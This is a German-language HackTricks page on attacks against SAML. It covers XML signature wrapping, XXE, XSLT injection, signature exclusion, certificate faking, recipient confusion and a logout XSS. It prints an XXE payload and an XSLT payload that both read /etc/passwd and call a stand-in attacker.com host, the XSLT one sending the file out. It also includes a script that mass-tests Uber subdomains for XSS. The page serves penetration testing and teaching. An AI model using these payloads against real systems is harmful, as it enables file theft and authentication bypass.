# SAML-Angriffe

## SAML-Angriffe

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

## Grundinformationen

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## Tool

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor): Ein Tool, das eine URL oder eine Liste von URLs akzeptieren kann und die SAML-Verbrauchs-URL zur√ºckgibt.

## XML-Rundreise

Im XML wird der signierte Teil des XML im Speicher gespeichert, dann wird eine gewisse Kodierung/Dekodierung durchgef√ºhrt und die Signatur wird √ºberpr√ºft. Idealerweise sollte diese Kodierung/Dekodierung die Daten nicht √§ndern, aber basierend auf diesem Szenario **k√∂nnten die √ºberpr√ºften Daten und die urspr√ºnglichen Daten nicht identisch sein**.

Zum Beispiel, √ºberpr√ºfen Sie den folgenden Code:
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
Das Ausf√ºhren des Programms gegen REXML 3.2.4 oder fr√ºher w√ºrde stattdessen die folgende Ausgabe ergeben:
```
First child in original doc: Y
First child after round-trip: Z
```
This is how REXML saw the original XML document from the program above:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (1001).png>)

And this is how it saw it after a round of parsing and serialization:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (445).png>)

For more information about the vulnerability and how to abuse it:

* [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
* [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## XML Signature Wrapping Attacks

In **XML Signature Wrapping attacks (XSW)**, Angreifer nutzen eine Schwachstelle aus, die auftritt, wenn XML-Dokumente in zwei verschiedenen Phasen verarbeitet werden: **Signaturvalidierung** und **Funktionsaufruf**. Diese Angriffe beinhalten die Ver√§nderung der XML-Dokumentstruktur. Insbesondere **injiziert der Angreifer gef√§lschte Elemente**, die die G√ºltigkeit der XML-Signatur nicht beeintr√§chtigen. Diese Manipulation zielt darauf ab, eine Diskrepanz zwischen den von der **Anwendungslogik** analysierten Elementen und den von dem **Signaturpr√ºfmodul** √ºberpr√ºften Elementen zu schaffen. Infolgedessen bleibt die XML-Signatur technisch g√ºltig und besteht die √úberpr√ºfung, w√§hrend die Anwendungslogik die **betr√ºgerischen Elemente** verarbeitet. Folglich umgeht der Angreifer effektiv den **Integrit√§tsschutz** und die **Ursprungsauthentifizierung** der XML-Signatur, was die **Einspeisung beliebiger Inhalte** ohne Erkennung erm√∂glicht.

Die folgenden Angriffe basieren auf [**diesem Blogbeitrag**](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/) **und** [**diesem Papier**](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf). √úberpr√ºfen Sie diese f√ºr weitere Details.

### XSW #1

* **Strategie**: Ein neues Root-Element, das die Signatur enth√§lt, wird hinzugef√ºgt.
* **Implikation**: Der Validator k√∂nnte zwischen dem legitimen "Response -> Assertion -> Subject" und dem "b√∂sen neuen Response -> Assertion -> Subject" des Angreifers verwirrt werden, was zu Datenintegrit√§tsproblemen f√ºhrt.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-1.svg](<../../.gitbook/assets/image (506).png>)

### XSW #2

* **Unterschied zu XSW #1**: Verwendet eine abgetrennte Signatur anstelle einer umschlie√üenden Signatur.
* **Implikation**: Die "b√∂se" Struktur, √§hnlich wie bei XSW #1, zielt darauf ab, die Gesch√§ftslogik nach der Integrit√§tspr√ºfung zu t√§uschen.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-2.svg](<../../.gitbook/assets/image (466).png>)

### XSW #3

* **Strategie**: Eine b√∂se Assertion wird auf derselben Hierarchieebene wie die urspr√ºngliche Assertion erstellt.
* **Implikation**: Zielt darauf ab, die Gesch√§ftslogik zu verwirren, damit sie die b√∂sartigen Daten verwendet.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-3.svg](<../../.gitbook/assets/image (120).png>)

### XSW #4

* **Unterschied zu XSW #3**: Die urspr√ºngliche Assertion wird ein Kind der duplizierten (b√∂sen) Assertion.
* **Implikation**: √Ñhnlich wie bei XSW #3, aber ver√§ndert die XML-Struktur aggressiver.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-4.svg](<../../.gitbook/assets/image (551).png>)

### XSW #5

* **Einzigartiger Aspekt**: Weder die Signatur noch die urspr√ºngliche Assertion entsprechen den Standardkonfigurationen (umschlossen/umschlie√üend/abgetrennt).
* **Implikation**: Die kopierte Assertion umschlie√üt die Signatur und √§ndert die erwartete Dokumentstruktur.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-5.svg](<../../.gitbook/assets/image (1030).png>)

### XSW #6

* **Strategie**: √Ñhnliche Standortinsertion wie XSW #4 und #5, aber mit einer Wendung.
* **Implikation**: Die kopierte Assertion umschlie√üt die Signatur, die dann die urspr√ºngliche Assertion umschlie√üt und eine verschachtelte t√§uschende Struktur schafft.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-6.svg](<../../.gitbook/assets/image (169).png>)

### XSW #7

* **Strategie**: Ein Extensions-Element wird eingef√ºgt, wobei die kopierte Assertion ein Kind ist.
* **Implikation**: Dies nutzt das weniger restriktive Schema des Extensions-Elements aus, um die Schema-Validierungsma√ünahmen zu umgehen, insbesondere in Bibliotheken wie OpenSAML.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-7.svg](<../../.gitbook/assets/image (971).png>)

### XSW #8

* **Unterschied zu XSW #7**: Verwendet ein anderes weniger restriktives XML-Element f√ºr eine Variante des Angriffs.
* **Implikation**: Die urspr√ºngliche Assertion wird ein Kind des weniger restriktiven Elements, wodurch die Struktur, die in XSW #7 verwendet wurde, umgekehrt wird.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-8.svg](<../../.gitbook/assets/image (541).png>)

### Tool

Sie k√∂nnen die Burp-Erweiterung [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) verwenden, um die Anfrage zu parsen, einen beliebigen XSW-Angriff anzuwenden, den Sie w√§hlen, und ihn zu starten.

## XXE

Wenn Sie nicht wissen, welche Art von Angriffen XXE sind, lesen Sie bitte die folgende Seite:

{% content-ref url="../xxe-xee-xml-external-entity.md" %}
[xxe-xee-xml-external-entity.md](../xxe-xee-xml-external-entity.md)
{% endcontent-ref %}

SAML-Antworten sind **deflatiertes und base64-kodiertes XML-Dokumente** und k√∂nnen anf√§llig f√ºr XML External Entity (XXE) Angriffe sein. Durch die Manipulation der XML-Struktur der SAML-Antwort k√∂nnen Angreifer versuchen, XXE-Schwachstellen auszunutzen. Hier ist, wie ein solcher Angriff visualisiert werden kann:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
## Tools

Sie k√∂nnen auch die Burp-Erweiterung [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) verwenden, um den POC aus einer SAML-Anfrage zu generieren, um m√∂gliche XXE-Schwachstellen und SAML-Schwachstellen zu testen.

√úberpr√ºfen Sie auch diesen Vortrag: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XSLT via SAML

F√ºr weitere Informationen zu XSLT gehen Sie zu:

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

Extensible Stylesheet Language Transformations (XSLT) k√∂nnen verwendet werden, um XML-Dokumente in verschiedene Formate wie HTML, JSON oder PDF zu transformieren. Es ist wichtig zu beachten, dass **XSLT-Transformationen vor der √úberpr√ºfung der digitalen Signatur durchgef√ºhrt werden**. Das bedeutet, dass ein Angriff auch ohne eine g√ºltige Signatur erfolgreich sein kann; eine selbstsignierte oder ung√ºltige Signatur reicht aus, um fortzufahren.

Hier finden Sie einen **POC**, um nach dieser Art von Schwachstellen zu suchen. Auf der Hacktricks-Seite, die zu Beginn dieses Abschnitts erw√§hnt wurde, finden Sie Payloads.
```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### Tool

Sie k√∂nnen auch die Burp-Erweiterung [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) verwenden, um das POC aus einer SAML-Anfrage zu generieren, um m√∂gliche XSLT-Schwachstellen zu testen.

√úberpr√ºfen Sie auch diesen Vortrag: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XML Signature Exclusion <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

Die **XML Signature Exclusion** beobachtet das Verhalten von SAML-Implementierungen, wenn das Signature-Element nicht vorhanden ist. Wenn dieses Element fehlt, **kann die Signaturvalidierung m√∂glicherweise nicht erfolgen**, was es anf√§llig macht. Es ist m√∂glich, dies zu testen, indem die Inhalte, die normalerweise von der Signatur √ºberpr√ºft werden, ver√§ndert werden.

![https://epi052.gitlab.io/notes-to-self/img/saml/signature-exclusion.svg](<../../.gitbook/assets/image (457).png>)

### Tool <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

Sie k√∂nnen auch die Burp-Erweiterung [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) verwenden. Fangen Sie die SAML-Antwort ab und klicken Sie auf `Remove Signatures`. Dabei werden **alle** Signature-Elemente entfernt.

Nachdem die Signaturen entfernt wurden, lassen Sie die Anfrage an das Ziel weiterleiten. Wenn die Signatur vom Dienst nicht ben√∂tigt wird.

## Certificate Faking <a href="#certificate-faking" id="certificate-faking"></a>

## Certificate Faking

Certificate Faking ist eine Technik, um zu testen, ob ein **Service Provider (SP) ordnungsgem√§√ü √ºberpr√ºft, dass eine SAML-Nachricht von einem vertrauensw√ºrdigen Identity Provider (IdP) signiert ist**. Es beinhaltet die Verwendung eines \***selbstsignierten Zertifikats**, um die SAML-Antwort oder -Assertion zu signieren, was hilft, den Vertrauensvalidierungsprozess zwischen SP und IdP zu bewerten.

### How to Conduct Certificate Faking

Die folgenden Schritte skizzieren den Prozess unter Verwendung der [SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) Burp-Erweiterung:

1. Fangen Sie die SAML-Antwort ab.
2. Wenn die Antwort eine Signatur enth√§lt, senden Sie das Zertifikat an SAML Raider Certs, indem Sie die Schaltfl√§che `Send Certificate to SAML Raider Certs` verwenden.
3. W√§hlen Sie im SAML Raider-Zertifikat-Tab das importierte Zertifikat aus und klicken Sie auf `Save and Self-Sign`, um einen selbstsignierten Klon des urspr√ºnglichen Zertifikats zu erstellen.
4. Gehen Sie zur√ºck zur abgefangenen Anfrage im Burp-Proxy. W√§hlen Sie das neue selbstsignierte Zertifikat aus dem Dropdown-Men√º f√ºr die XML-Signatur aus.
5. Entfernen Sie alle vorhandenen Signaturen mit der Schaltfl√§che `Remove Signatures`.
6. Signieren Sie die Nachricht oder Assertion mit dem neuen Zertifikat, indem Sie die Schaltfl√§che **`(Re-)Sign Message`** oder **`(Re-)Sign Assertion`** verwenden, je nach Bedarf.
7. Leiten Sie die signierte Nachricht weiter. Eine erfolgreiche Authentifizierung zeigt an, dass der SP Nachrichten akzeptiert, die mit Ihrem selbstsignierten Zertifikat signiert sind, was potenzielle Schwachstellen im Validierungsprozess der SAML-Nachrichten offenbart.

## Token Recipient Confusion / Service Provider Target Confusion <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

Token Recipient Confusion und Service Provider Target Confusion beinhalten die √úberpr√ºfung, ob der **Service Provider den beabsichtigten Empf√§nger einer Antwort korrekt validiert**. Im Wesentlichen sollte ein Service Provider eine Authentifizierungsantwort ablehnen, wenn sie f√ºr einen anderen Anbieter bestimmt war. Das entscheidende Element hier ist das **Recipient**-Feld, das sich im **SubjectConfirmationData**-Element einer SAML-Antwort befindet. Dieses Feld gibt eine URL an, die angibt, wo die Assertion gesendet werden muss. Wenn der tats√§chliche Empf√§nger nicht mit dem beabsichtigten Service Provider √ºbereinstimmt, sollte die Assertion als ung√ºltig angesehen werden.

#### **How It Works**

Damit ein SAML Token Recipient Confusion (SAML-TRC) Angriff durchf√ºhrbar ist, m√ºssen bestimmte Bedingungen erf√ºllt sein. Erstens muss es ein g√ºltiges Konto bei einem Service Provider (als SP-Legit bezeichnet) geben. Zweitens muss der angegriffene Service Provider (SP-Target) Tokens vom selben Identity Provider akzeptieren, der SP-Legit bedient.

Der Angriffsprozess ist unter diesen Bedingungen unkompliziert. Eine authentische Sitzung wird mit SP-Legit √ºber den gemeinsamen Identity Provider initiiert. Die SAML-Antwort vom Identity Provider an SP-Legit wird abgefangen. Diese abgefangene SAML-Antwort, die urspr√ºnglich f√ºr SP-Legit bestimmt war, wird dann an SP-Target umgeleitet. Der Erfolg dieses Angriffs wird daran gemessen, dass SP-Target die Assertion akzeptiert und den Zugriff auf Ressourcen gew√§hrt, die unter demselben Kontonamen verwendet werden, der f√ºr SP-Legit verwendet wurde.
```python
# Example to simulate interception and redirection of SAML Response
def intercept_and_redirect_saml_response(saml_response, sp_target_url):
"""
Simulate the interception of a SAML Response intended for SP-Legit and its redirection to SP-Target.

Args:
- saml_response: The SAML Response intercepted (in string format).
- sp_target_url: The URL of the SP-Target to which the SAML Response is redirected.

Returns:
- status: Success or failure message.
"""
# This is a simplified representation. In a real scenario, additional steps for handling the SAML Response would be required.
try:
# Code to send the SAML Response to SP-Target would go here
return "SAML Response successfully redirected to SP-Target."
except Exception as e:
return f"Failed to redirect SAML Response: {e}"
```
## XSS in Logout-Funktionalit√§t

Die urspr√ºngliche Forschung kann √ºber [diesen Link](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/) aufgerufen werden.

W√§hrend des Prozesses des Directory Brute Forcings wurde eine Logout-Seite entdeckt unter:
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
Beim Zugriff auf diesen Link erfolgte eine Weiterleitung zu:
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
Dies zeigte, dass der `base`-Parameter eine URL akzeptiert. In Anbetracht dessen entstand die Idee, die URL durch `javascript:alert(123);` zu ersetzen, um einen XSS (Cross-Site Scripting) Angriff zu initiieren.

### Massenexploitation

[Aus dieser Forschung](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/):

Das [**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor) Tool wurde verwendet, um Subdomains von `uberinternal.com` f√ºr Domains zu analysieren, die dieselbe Bibliothek nutzen. Anschlie√üend wurde ein Skript entwickelt, um die `oidauth/prompt`-Seite anzugreifen. Dieses Skript testet auf XSS (Cross-Site Scripting), indem es Daten eingibt und √ºberpr√ºft, ob sie im Output reflektiert werden. In F√§llen, in denen die Eingabe tats√§chlich reflektiert wird, kennzeichnet das Skript die Seite als anf√§llig.
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## Referenzen

* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\\
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
* [https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
